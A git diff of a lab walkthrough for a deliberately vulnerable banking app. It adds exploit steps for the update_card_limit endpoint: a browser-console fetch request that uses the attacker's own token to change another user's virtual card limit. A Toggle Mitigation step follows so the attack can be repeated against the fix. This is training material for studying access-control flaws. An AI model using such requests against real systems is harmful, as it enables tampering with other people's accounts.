@@ -69,7 +69,7 @@ Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button
 ![alt text](./screenshots/image-6.png)
 
 ### get_card_transactions()
-Grants attacker access to a collection of transactions related to any card of any user.
+Grants attacker access to a collection of transactions related to any virtual card of any user.
 #### Exploit
 1. Log in as any user and open browser console.
 2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:
@@ -86,9 +86,25 @@ Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button
 ![alt text](./screenshots/image-9.png)
 
 ### update_card_limit()
-Allows attacker to update the limit on any card belonging to any user.
+Allows attacker to update the limit on any virtual card belonging to any user.
 #### Exploit
+1. Log in as any user and open the browser console.
+2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:
+
+    `fetch('/api/virtual-cards/<vc_num>/update-limit', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
+    },
+    body: JSON.stringify({ card_limit: 50000 })
+    }).then(r => r.json()).then(console.log);`
+
+![alt text](./screenshots/image-10.png)
+
 #### Mitigate
+Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack and observe outcome:
+![alt text](./screenshots/image-11.png)
 
 ### create_bill_payment()
 Allows attacker to create a payment on the balance of any card belonging to any user.
